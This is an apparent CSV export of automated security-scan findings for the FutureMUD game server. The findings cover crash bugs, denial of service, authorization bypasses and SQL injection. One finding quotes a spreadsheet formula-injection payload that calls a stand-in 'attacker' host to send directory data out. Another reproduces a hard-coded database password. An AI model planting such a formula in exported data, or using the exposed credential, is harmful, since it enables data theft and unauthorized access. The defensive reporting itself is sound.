finding_url,repository,repository_url,title,description,severity,status,detected_at,committed_at,author_email,assignee_name,assignee_email,has_patch,configured_scan_id,commit_hash,relevant_paths,resolution_reason,triage_group
https://chatgpt.com/codex/cloud/security/findings/28af8900d91c81918d666c98b8cb7573,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Legacy scar applications can crash the server,"Scar template rows are now deliberately converted to null and skipped during world loading. However, existing chargen XML can still contain legacy SelectedDisfigurements entries that point at those scar template IDs. Chargen.LoadFromXml unconditionally adds the lookup result to SelectedDisfigurements, even when the template lookup returns null. LoadFromXml then calls RecalculateCurrentCosts, which reaches DisfigurementPickerScreenStoryboard.ChargenCosts and dereferences disfigurement.Disfigurement.ChargenCosts. For a legacy scar selection this is a NullReferenceException. In release builds, PlayerConnection.AttemptCommand catches any player-input exception, writes a crash log, and calls Environment.Exit(0), so an authenticated player resuming a pre-upgrade in-progress chargen with a scar selection can terminate the server. Submitted legacy applications may similarly crash staff/review paths that load or recalculate costs. The migration/refactor should either migrate old scar selections into SelectedScars or ignore/null-check legacy scar disfigurements when loading and when calculating costs.",medium,new,2026-06-01T19:19:06.308934Z,2026-04-13 06:05:17 +1000,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,9f6d569903f3404b0e1c73f9cd3636ba5c40f9b3,MudSharpCore/Body/Disfigurements/DisfigurementFactory.cs | MudSharpCore/Framework/FuturemudLoaders.cs | MudSharpCore/CharacterCreation/Chargen.cs | MudSharpCore/CharacterCreation/Screens/DisfigurementPickerScreen.cs | MudSharpCore/Network/PlayerConnection.cs,,"Character, Body, Chargen & Health"
https://chatgpt.com/codex/cloud/security/findings/55c937a49c1881919f7e9b264cba50b9,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Tiered laws now let criminals outrank citizens,"Before this change, tier comparisons were generated from a fixed social order where Citizen and Non-Citizen outranked Felon and Criminal. The commit now generates tier checks using LegalClassOutranks, which compares LegalClassPriority numerically. The seeded priorities place Enforcer=60, Felon=55, Criminal=54, Citizen=50, and Non-Citizen=40. As a result, when a character resolves to the Criminal or Felon legal class, LegalClassOutranks reports that they outrank ordinary citizens/non-citizens. For tiered victim-based crimes, the generated 'Against Inferior' law variant is selected when the offender outranks the victim, and that variant disables active enforcement, imprisonment, capital punishment, arrest, and bail handling, leaving only a fine. A player who becomes wanted/criminal or is a felon can therefore receive weaker automatic enforcement for later serious crimes against citizens in affected seeded legal systems.",medium,new,2026-06-01T19:31:45.206089Z,2026-04-12 21:20:30 +1000,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,0d0bd2989ad8a9f087de56879b6371e1b3ec135f,DatabaseSeeder/Seeders/LawSeeder.cs | MudSharpCore/FutureProg/Functions/Crime/LegalClassOutranksFunction.cs,,"Legal, Crime & Law Enforcement"
https://chatgpt.com/codex/cloud/security/findings/aad13c26f9e48191baab65b0fdcbb931,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Arena scoring snapshots leak memory across completed events,"The new scoring path records an ArenaScoringSnapshot for every scorable combat resolution between participants in any live arena event. These snapshots include attacker/defender character references and impact strings, are exposed through ScoringSnapshots, and are copied into multiple lists whenever event prog arguments are built. The only clear happens in StartLive before recording begins. FinalizeParticipants does not clear the list, and CombatArena keeps created and loaded events in its _events list even after they are completed or aborted, merely filtering them out of ActiveEvents. As a result, every completed arena event can retain all combat-resolution snapshots for the life of the process. An authenticated player who can participate in scheduled/recurring arena fights can increase memory use over time through normal combat activity, potentially causing server availability degradation or eventual memory exhaustion on long-running servers. The fix should clear _scoringSnapshots during cleanup/completion/abort/finalization, consider recording only for event types that actually need scoring snapshots, and/or cap or aggregate scoring data instead of storing unbounded per-hit records.",medium,new,2026-06-01T19:18:42.621373Z,2026-04-10 15:21:56 +1000,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,00bf7b2ee23ab9bcb26d20e09360f5cac3a4eb5e,MudSharpCore/Combat/CombatBase.cs | MudSharpCore/Arenas/ArenaScoringHelper.cs | MudSharpCore/Arenas/Core/ArenaEvent.cs | MudSharpCore/Arenas/ArenaProgParameters.cs | MudSharpCore/Arenas/Core/CombatArena.cs,,"Arena, Betting & Competition"
https://chatgpt.com/codex/cloud/security/findings/90b3f6810b508191b62fb151abbb089c,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Tattoo copy can exfiltrate arbitrary writing text,"The commit adds `slot=copy:writingId` support to the player-accessible `tattoo inscribe` command. That parser resolves the supplied ID directly through `actor.Gameworld.Writings.Get(writingId)`, extracts the underlying `SimpleWriting.Text` or `CompositeWriting.Text`, and stores it in the tattoo text value. There is no authorization check tying the writing to an item the actor can see/hold/target, and `actor.CanRead(writing)` is only used to add a skill penalty, not to prevent copying or reading the raw text. A player with tattooing capability and a consenting/controlled target can therefore enumerate or guess writing IDs and copy private letters, books, graffiti, or other writings into a tattoo. The copied text is later rendered into writing markup. Additionally, the new `ITattoo.ShortDescription` implementation renders via `ShortDescriptionFor(null)`, and `SubstituteWrittenLanguage` returns the readable text when the perceiver is null; remaining call sites such as the tattoo completion emote call `Tattoo.ShortDescription.SubstituteWrittenLanguage(...)`, which can expose tattoo text without the intended language/script checks.",medium,new,2026-06-01T19:49:46.948157Z,2026-04-04 21:22:07 +1100,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,43c35254452b0251912cd018a43d0a59a9fd4e54,MudSharpCore/Commands/Modules/BuilderModule.cs | MudSharpCore/Body/Disfigurements/TattooTextCommandHelper.cs | MudSharpCore/Body/Disfigurements/TattooTextModels.cs | MudSharpCore/Body/Disfigurements/Tattoo.cs | FutureMUDLibrary/Framework/StringUtilities.cs | MudSharpCore/Effects/Concrete/InkingTattoo.cs,,"Character, Body, Chargen & Health"
https://chatgpt.com/codex/cloud/security/findings/8b9ae814a0688191a2fa3416ffb2dd86,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Unescaped snapshot database name permits SQL injection,"The commit adds a fast path that imports DatabaseSeeder/BlankDatabaseSnapshot.sql for databases that appear blank. That SQL file places the __FUTUREMUD_DATABASE__ placeholder inside backtick-quoted MySQL identifiers. DatabaseUpgradeCoordinator.ImportBlankDatabaseSnapshot replaces the placeholder with MySqlConnectionStringBuilder.Database verbatim and then executes the whole script with MySqlScript. A crafted database name containing a backtick and additional SQL can break out of the quoted identifier and execute arbitrary SQL as the configured MySQL user during seeder bootstrap. This is not reachable from normal MUD clients, but it is security-relevant for deployment tooling or hosted/automated environments where a lower-trust party can influence the seeder connection string or database name.",medium,new,2026-06-01T20:23:24.976741Z,2026-04-03 10:03:50 +1100,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,ee4909dae4d7a3f921f16122f2e141863333ffa2,DatabaseSeeder/Program.cs | DatabaseSeeder/BlankDatabaseSnapshot.sql | MudsharpDatabaseLibrary/Database/DatabaseUpgradeCoordinator.cs | MudsharpDatabaseLibrary/Database/MySqlDatabaseBackupService.cs,,"Database Seeder, Migrations & Seed Data"
https://chatgpt.com/codex/cloud/security/findings/7b915639c7088191beb209f605f1908b,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Unbounded fax queue enables persistent DoS,"The commit introduces a player-accessible fax command and a receiver-side pending fax queue. A sender can repeatedly fax the same readable document to a powered destination fax machine that has no paper/ink or cannot fit the content. The destination still satisfies CanReceiveFaxes, TrySendFax delivers the document, and ReceiveFax unconditionally appends a new IncomingFaxJob to _pendingFaxes. Jobs are only removed after successfully printing; if supplies remain unavailable or a document cannot fit on blank paper, the queue remains and future faxes continue to accumulate. The full pending queue is serialized into the game item XML, so abuse can grow live memory, save data, load-time work, and later printing work without a bounded in-game resource cost to the sender. Shared fax numbers can also multiply delivery to multiple receivers.",medium,new,2026-06-01T20:50:03.876681Z,2026-04-01 09:00:30 +1100,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,766f61eb9a01c12a0f983b9c7be0032dc5a335d6,MudSharpCore/Commands/Modules/CommunicationsModule.cs | MudSharpCore/Construction/Grids/TelecommunicationsGrid.cs | MudSharpCore/GameItems/Components/FaxMachineGameItemComponent.cs,,Communications & Telecommunications
https://chatgpt.com/codex/cloud/security/findings/ee915f2549908191bddc2f5f6574eb4f,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Hosted voicemail allows unbounded persistent message storage,"When a call rings out to hosted voicemail, every transmitted speech segment from the caller is appended to an in-memory list and later stored in the grid's central voicemail dictionary. The storage path simply appends to the mailbox and serializes all stored recordings into the grid XML. Unlike the existing physical answering-machine path, there is no tape capacity check or any other per-message/per-mailbox cap. A normal authenticated player who can place calls to a voicemail-enabled line can repeatedly leave long messages and cause unbounded memory growth during calls and unbounded persistent database/XML growth after saves, potentially exhausting disk/database storage or making grid load/save increasingly expensive.",medium,new,2026-06-01T20:54:42.735094Z,2026-04-01 07:49:02 +1100,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,5ddfe3c35d47f81819b703d3d57ec80cda633bff,MudSharpCore/Construction/Grids/TelecommunicationsGrid.cs,,Communications & Telecommunications
https://chatgpt.com/codex/cloud/security/findings/f8807562ec348191a6b4c401032399c6,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Unbounded answering-machine greeting recording DoS,"A player who can manipulate an answering machine can start greeting recording and then keep speaking near the machine. Each speech event appends a RecordedAudioSegment, including raw text, to _workingGreetingSegments. Unlike message recording, greeting recording does not check Tape.CanStoreRecording or any segment/duration limit before appending. The tape capacity check happens only later when the user issues greeting stop, so an attacker can simply never stop recording and grow server memory until the process becomes unstable or dies.",medium,new,2026-06-01T20:54:30.940892Z,2026-03-31 23:50:11 +1100,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,61fc4b496f7871321f771b045c512624d9b2b94d,MudSharpCore/GameItems/Components/AnsweringMachineGameItemComponent.cs,,Communications & Telecommunications
https://chatgpt.com/codex/cloud/security/findings/6d5e9c246cd881918cab4ae7b86a6b0e,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Telecom feeder power loops can crash the server,"TelecommunicationsGridFeederGameItemComponent implements IProducePower by delegating MaximumPowerInWatts and ProducingPower to its _connectedPowerSource. This commit changed Parent_OnConnected to accept a connected IProducePower when either PrimaryExternalConnectionPowerProducer is true or MaximumPowerInWatts is currently positive. Because another telecom feeder can have MaximumPowerInWatts > 0 by delegating to its own upstream source, two already-powered feeders can be connected together and each can overwrite its upstream source with the other feeder. That creates A._connectedPowerSource = B and B._connectedPowerSource = A. Subsequent reads of MaximumPowerInWatts, ProducingPower, PowerConsumptionInWatts, or disconnect handling recurse until StackOverflowException, which is typically process-terminating in .NET. The normal player 'connect' command reaches this code for manipulable compatible items, so an authenticated player with access to appropriate powered feeder objects can cause a server availability failure.",medium,new,2026-06-01T21:11:06.111523Z,2026-03-31 13:04:36 +1100,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,f719a6528373d10e8295b06378e56f5b0633e336,MudSharpCore/GameItems/Components/TelecommunicationsGridFeederGameItemComponent.cs | MudSharpCore/Commands/Modules/ManipulationModule.cs | MudSharpCore/Body/Implementations/BodyBehaviours.cs,,Communications & Telecommunications
https://chatgpt.com/codex/cloud/security/findings/dafe176a32d081919cf740ad2e51fba0,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Implant phones bypass neural control checks,"Implant telephones are intended to be controlled through a neural-interface command surface, but the component also implements the generic ITelephone/ITransmit interfaces. The existing player-facing dial/answer/pickup/hangup/transmitwith commands target any item exposing ITelephone/ITransmit and only require normal item manipulation. The new ImplantTelephoneGameItemComponent's Dial/CanDial and Transmit methods check grid, power, coverage, and call state, but do not verify HasAudioAccess, a powered audio-capable DNI link, or that the actor is the installed body's actor issuing the command through IImplantNeuralLink. As a result, a player can use standard room/inventory phone commands on a targetable external implant telephone, bypassing the intended neural-interface restrictions. The same missing boundary also makes the implant's IReceive implementation accept speech from arbitrary transmit origins and deliver it internally whenever HasAudioAccess is true, without checking that the speech belongs to the current telephone call.",medium,new,2026-06-01T21:13:36.586565Z,2026-03-31 12:31:42 +1100,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,4791ac8bf9e52089d11ca47662a968ccbbc538d9,MudSharpCore/GameItems/Components/ImplantTelephoneGameItemComponent.cs | MudSharpCore/Commands/Modules/CommunicationsModule.cs,,Communications & Telecommunications
https://chatgpt.com/codex/cloud/security/findings/bd4c147bb3fc8191ade4356748b8e9dc,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Cell phone signal checks allow item-scan DoS,"The commit introduces cellular phones and towers. CellularPhoneGameItemComponent.HasCoverage calls HasCoverageInZone, which enumerates Gameworld.Items and inspects every item for an ICellPhoneTower. HasCoverage is used in full item descriptions, dialing, answering, and CanReceiveCalls. The player-facing dial command invokes telephone.Dial, and incoming calls also evaluate CanReceiveCalls for target phones. In a large MUD world, an authenticated player can repeatedly trigger O(total loaded items) scans on the main game loop by looking at a cellular phone, dialing from one, or dialing a cellular phone number. Because MUD command processing is latency-sensitive and often single-loop driven, this can be used to degrade availability. Coverage should be indexed or cached by grid/zone/tower membership rather than discovered by scanning every game item on each command.",medium,new,2026-06-01T21:13:43.362154Z,2026-03-31 12:10:46 +1100,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,dfaae416b349937715f9f97a9ea89e1836aab253,MudSharpCore/Commands/Modules/CommunicationsModule.cs | MudSharpCore/GameItems/Components/CellularPhoneGameItemComponent.cs | MudSharpCore/Construction/Grids/TelecommunicationsGrid.cs,,Communications & Telecommunications
https://chatgpt.com/codex/cloud/security/findings/ec61eaa351d881918ba4b6be7b6f54b6,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Grid liquid source merge can crash the server,"GridLiquidSourceGameItemComponent is still exposed as an ILiquidContainer, but its MergeLiquid implementation now unconditionally throws. Normal fill/pour commands mostly avoid this because the same commit sets LiquidCapacity to 0.0 and those commands check capacity first. However, generic liquid-application paths can still identify the grid source as an ILiquidContainer and call MergeLiquid directly. CreateLiquidEffect is compatible with item-target spell triggers and, for item targets with an ILiquidContainer component, calls container.MergeLiquid when CanMerge is true. LiquidMixture.CanMerge currently always returns true. If a normal player can cast an item-target create-liquid spell at a visible grid liquid source item, this exception propagates out of command processing. PlayerConnection.AttemptCommand catches it, writes a crash log, and calls Environment.Exit(0), turning the invalid operation into a process-wide denial of service.",medium,new,2026-06-01T21:10:36.334209Z,2026-03-30 19:59:31 +1100,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,bb7809d9f26dd0a6dea4140a25c83d7afa897218,MudSharpCore/GameItems/Components/GridLiquidSourceGameItemComponent.cs | MudSharpCore/Magic/SpellEffects/CreateLiquidEffect.cs | FutureMUDLibrary/Form/Material/LiquidMixture.cs | MudSharpCore/Network/PlayerConnection.cs,,"Crafting, Agriculture, Materials & Resources"
https://chatgpt.com/codex/cloud/security/findings/5d53e07af3688191ab3d1ce5449a6bd7,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Grid liquid sources do not consume liquid on Reduce operations,"The commit adds GridLiquidSourceGameItemComponent as an ILiquidContainer backed by a liquid grid. Its LiquidMixture and LiquidVolume report the grid contents, but ReduceLiquidQuantity, AddLiquidQuantity, and MergeLiquid are empty methods. Existing code assumes ILiquidContainer.ReduceLiquidQuantity actually removes liquid after actions such as drinking or emptying a container. As a result, an authenticated player who can access a grid liquid source can repeatedly drink from it without depleting the underlying suppliers, and if the source can be carried or otherwise used with empty/craft paths, can create puddles or products from the same grid liquid repeatedly. This breaks world/economy integrity and can also be abused for availability by generating many liquid/puddle objects.",medium,new,2026-06-01T21:11:30.450595Z,2026-03-30 16:58:02 +1100,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,5f0f1a536cb6b0c679eef45bff6e43a52935ec4b,MudSharpCore/GameItems/Components/GridLiquidSourceGameItemComponent.cs | MudSharpCore/Commands/Modules/ManipulationModule.cs | MudSharpCore/Body/Implementations/BodyNeeds.cs,,"Crafting, Agriculture, Materials & Resources"
https://chatgpt.com/codex/cloud/security/findings/424207299fd081918a0fb29160f0762a,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Estate-less morgue corpses can bypass item ownership,"Previously morgue intake always ensured an estate existed and stripped corpse possessions into a morgue belongings bundle. The claim path for items from that bundle only releases items whose Owner is the claiming actor. This commit allows EnsureEstate to return null when estates are disabled or when CreateEstatesForCharacterDeath creates no estate. In that no-estate case, IntakeCorpse still stores the corpse but skips stripping belongings. The new corpse-claim authorization then allows the deceased character's EstateHeir to claim an estate-less corpse, and MorgueClaimCorpse releases the entire corpse into the claimant's room. Because estate creation explicitly ignores items that have an owner other than the deceased, a corpse containing only other players' owned items can be stored with EstateId 0 and all belongings still attached. The deceased's heir can then retrieve the corpse and potentially access/loot those items, bypassing the intended owner-only MorgueClaimItem path.",medium,new,2026-06-01T21:20:54.294192Z,2026-03-29 22:13:25 +1100,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,d28ac0e4eadb89e6f3df25defef14418918a5a91,MudSharpCore/Economy/Estates/Estate.cs | MudSharpCore/Economy/Estates/MorgueService.cs | MudSharpCore/Effects/Concrete/MorgueStoredCorpse.cs | MudSharpCore/Commands/Modules/EconomyModule.cs,,"Economy — Shops, Property, Banking & Ledger"
https://chatgpt.com/codex/cloud/security/findings/9bb93a5dc7d08191995c7d63ae58efa4,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Strip acceptance grants broad inventory consent,"The commit changes accepted strip requests to add a temporary BeDressedEffect to the target for the computed strip duration plus five seconds. BeDressedEffect is a general consent effect used by WillingToPermitInventoryManipulation and CanBeRemoved/CanDress, not a strip-specific authorization. During that window, the requester can perform other inventory actions against the victim, such as taking held, wielded, or other direct items, or interacting with permitted containers, even though the victim only accepted a specific strip request. This is especially problematic because the Take command is instant and relies on CanBeRemoved/WillingToPermitInventoryManipulation; DirectItems includes wielded, held, and worn items. If the target has no worn items, the strip duration can be zero while still granting five seconds of broad consent.",medium,new,2026-06-01T21:29:21.524794Z,2026-03-28 22:35:09 +1100,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,1cab50d4b94003f524e7bd00bb55616b0a0f30e9,MudSharpCore/Commands/Modules/InventoryModule.cs | MudSharpCore/Character/Character.cs | MudSharpCore/Body/Implementations/BodyInventory.cs,,"Inventory, Items & Object Components"
https://chatgpt.com/codex/cloud/security/findings/4712a1a12fd881918419af405c7fc188,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Admin prog result display can crash the game loop,"This commit adds collection/dictionary rendering to ProgModule.DescribeProgVariable. For collection return types it casts the result to IList and recursively calls DescribeProgVariable on each item using the element type. However FutureProg execution returns variable.GetObject; CollectionVariable.GetObject is the underlying IList of IProgVariable elements, not unwrapped scalar objects. When a prog returning, for example, a text collection is executed with `prog execute`, the recursion reaches the scalar text case and attempts `(string)result` on a TextVariable object, causing InvalidCastException. The exception is outside the FutureProg execution catch block and outside command-level handling, so it can bubble out of ProcessPendingCommands and stop the main game loop. The command requires PermissionLevel.Admin, so this is not remotely exploitable by ordinary players, but it allows an Admin-level account to cause a whole-service availability failure without SeniorAdmin shutdown rights.",medium,new,2026-06-01T21:47:23.147437Z,2026-03-21 22:27:48 +1100,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,2d6ce6d1778c6e6470d7b1d0ff00e4addca36a47,MudSharpCore/Commands/Modules/ProgModule.cs | FutureMUDLibrary/FutureProg/Variables/CollectionVariable.cs | MudSharpCore/FutureProg/FutureProg.cs | MudSharpCore/Framework/Futuremud.cs,,"FutureProg, Expressions & Script Runtime"
https://chatgpt.com/codex/cloud/security/findings/b5aaaa1fdc0c81919571216435234192,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Hard-coded database credentials added to EF factory,"A new FuturemudDatabaseContextFactory hard-codes a MySQL connection string with uid=futuremud and password=rpiengine2020. Even though the factory is intended for design-time EF tooling and points at localhost, committing reusable database credentials creates a credential-disclosure and insecure-default risk for operators who copy or deploy this configuration unchanged. If the database account exists with meaningful privileges and MySQL is reachable to an attacker, the exposed password can allow unauthorized database access.",medium,new,2026-06-01T21:47:01.722732Z,2026-03-21 22:08:05 +1100,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,aaa29b88c39be65b5681f659f9bcb79b51f5e7e6,MudsharpDatabaseLibrary/Database/FuturemudDatabaseContextFactory.cs,,"Secrets, Build Scripts & Dev Artifacts"
https://chatgpt.com/codex/cloud/security/findings/22421579bc6c8191b9b527ef6f33bf08,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Null combat settings can crash server command handling,"RevalidateCombatSettingsAfterInitialisation now assigns the raw result of ResolveCombatSettingsAfterInitialisation to CombatSettings. CharacterCombatSettingsResolver.ResolveFallback can return null if the race/NPC/default setting is not usable and no global combat setting passes CanUse. The prior code retained the provisional setting in that case; the new code clears it. Once a character is in this null state, normal player-accessible commands such as `combat show` dereference the current setting without checking for null. PlayerConnection.AttemptCommand catches such exceptions, writes a crash log, and calls Environment.Exit(0), turning the null dereference into a server-wide availability issue. Exploitability depends on a game configuration or player-selectable character path where no combat settings validate for that character, so this is configuration-dependent rather than universally reachable.",medium,new,2026-06-01T21:54:26.952248Z,2026-03-21 15:57:58 +1100,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,b9547f3d338c61aa473ab29fccf0ac72ae8f6150,MudSharpCore/Character/CharacterCombat.cs | MudSharpCore/Combat/CharacterCombatSettingsResolver.cs | MudSharpCore/Commands/Modules/CombatModule.cs | MudSharpCore/Network/PlayerConnection.cs,,"Combat, Weapons & Wounds"
https://chatgpt.com/codex/cloud/security/findings/94537aa28c648191aa53d3b239f98f04,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Weather statistics CSV allows spreadsheet formula injection,"The commit makes the weather statistics exporter actually emit CSV rows and metadata using EscapeCsv. EscapeCsv only quotes fields containing commas, quotes, CR/LF, or leading/trailing whitespace. It does not guard values beginning with spreadsheet formula trigger characters such as '=', '+', '-', or '@'. Weather event and season/controller names are included in the generated CSV metadata and row fields, and weather events can be named by SeniorAdmin users. A lower-privileged staff member who can create or rename weather events could choose a name such as '=WEBSERVICE(""https://attacker/""&INFO(""directory""))' or another spreadsheet formula payload. When a Founder runs impdebug weatherstats and opens the generated CSV in Excel/LibreOffice/Google Sheets, the formula can execute in the spreadsheet context, potentially exfiltrating local data or misleading/modifying the opened report. This was introduced by replacing the previous NotImplementedException in EscapeCsv with delimiter-only CSV escaping and adding metadata/row output that includes these names.",medium,new,2026-06-01T22:39:20.134652Z,2026-03-07 16:47:45 +1100,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,e6c6e32e5a7b6739e0302f68c677edf82c2d5971,MudSharpCore/Commands/Modules/ImplementorModule.cs | MudSharpCore/Commands/Modules/WeatherModule.cs | MudSharpCore/Climate/WeatherEvents/WeatherEventBase.cs,,"Climate, Weather, Time & Scheduling"
https://chatgpt.com/codex/cloud/security/findings/6c19a6f360d48191a9e5fe3407ee4dff,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Shop buys can pull stock from private workshop areas,"PermanentShop.StockedItems now builds its candidate stock list from AllShopCells. AllShopCells includes the shopfront, workshop, and stockroom. This is a security-relevant authorization regression because the normal buy flow only requires the buyer to be at the shop, then uses StockedItems to select purchasable items. Shop.Buy subsequently removes the selected item from its current holder/container/location and transfers it to the buyer. As a result, any item with ItemOnDisplayInShop in a private workshop/stockroom cell, inside a nested container there, or held by a character in those cells can become remotely purchasable from the public shop interface, bypassing physical access, locks/containers, and character possession boundaries. The previous implementation only considered characters in shopfront cells and shallow items in shopfront/stockroom cells, so expanding to AllShopCells and DeepItems introduced the workshop/private-area exposure.",medium,new,2026-06-01T22:39:15.744410Z,2026-03-07 09:21:46 +1100,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,b2c0ca991c4d86e6fa5bce44df2ec840e16a5903,MudSharpCore/Economy/Shops/PermanentShop.cs | MudSharpCore/Commands/Modules/EconomyModule.cs | MudSharpCore/Economy/Shops/Shop.cs,,"Economy — Shops, Property, Banking & Ledger"
https://chatgpt.com/codex/cloud/security/findings/8d9ec4151d38819196cfb2384c957c9f,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Arena manager rating lookup leaks arbitrary characters,"The newly added `arena manager rating [<arena>] <character>` command only verifies that the caller manages the selected arena, but it does not restrict the target character to someone visible to the caller, in the arena, or someone with an existing rating record for that arena. If the input is numeric, `ResolveCharacter` calls `actor.Gameworld.TryGetCharacter(id, true)`, which loads any matching character from the database into the cached actor set. The command then displays `target.HowSeen(... TrueDescription)` and default ratings for every combatant class even when the target has never participated in that arena. A low-privileged player who has been made an arena manager can iterate character IDs to confirm whether characters exist and reveal their true names/descriptions, bypassing normal perception/privacy boundaries. Repeated lookups can also force database loads and grow `_cachedActors` with arbitrary offline characters.",medium,new,2026-06-01T22:47:59.628727Z,2026-02-27 19:55:26 +1100,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,b95ec318e827d071183a01bd20d693b76705ffdc,MudSharpCore/Commands/Modules/ArenaModule.cs | MudSharpCore/Framework/Futuremud.cs,,"Arena, Betting & Competition"
https://chatgpt.com/codex/cloud/security/findings/6bd39f5380948191b0c9ba942648e79c,FutureMUD/FutureMUD,https://github.com/FutureMUD/FutureMUD,Extreme arena ratings can crash fixed-odds betting,"This commit introduces rating-based fixed-odds pricing. `ComputeSideWinProbabilities` computes `Math.Pow(10.0, rating / 400)` for every side and then casts the normalized double back to decimal. Arena ratings and Elo K-factors are stored as high-precision decimals and are not capped. If any side rating is large enough for `Math.Pow` to produce `Infinity` (roughly rating > 123,000), normalization produces `Infinity / Infinity` or `NaN`, and casting that result to `decimal` throws an exception. The player-facing `arena bet odds` path calls `GetQuote` without a local try/catch. In production builds, an uncaught exception during player input is caught by `PlayerConnection.AttemptCommand`, logged, and followed by `Environment.Exit(0)`, killing the whole MUD server. Reaching such an extreme rating requires a special/misconfigured arena state, for example an admin using the existing unbounded Elo K-factor setting or seeded/imported rating data, but once present an authenticated remote player can trigger the crash by requesting fixed odds for the event.",medium,new,2026-06-01T22:49:05.327547Z,2026-02-27 07:34:29 +1100,luke.russell.cunningham@gmail.com,,,false,user-IoCe8jumpATRNJrqq5MmMGQr:github-624852333,757a07ae3bc7010b6e687de659daa44b11278ffd,MudSharpCore/Arenas/Betting/ArenaBettingService.cs | MudSharpCore/Commands/Modules/ArenaModule.cs | MudSharpCore/Arenas/Core/ArenaEventType.cs | MudSharpCore/Network/PlayerConnection.cs,,"Arena, Betting & Competition"
